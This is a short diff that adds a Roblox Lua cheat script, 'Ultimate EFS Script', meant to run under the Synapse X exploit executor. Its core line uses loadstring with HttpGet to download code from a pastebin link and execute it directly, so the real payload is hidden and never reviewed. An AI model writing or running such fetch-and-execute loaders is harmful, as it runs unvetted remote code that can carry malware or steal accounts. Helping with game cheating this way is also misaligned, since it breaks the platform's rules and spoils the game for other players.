@@ -1,0 +1,8 @@
+--[[
+Ultimate EFS Script by xboxfan523!
+Works with every exploit!
+You need Synapse X for the anti disconnect and auto attack.
+]]
+
+loadstring(game:HttpGet('https://pastebin.com/raw/PsPNL7UZ',true))()
+print("Ultimate EFS Script has loaded! Have fun!")
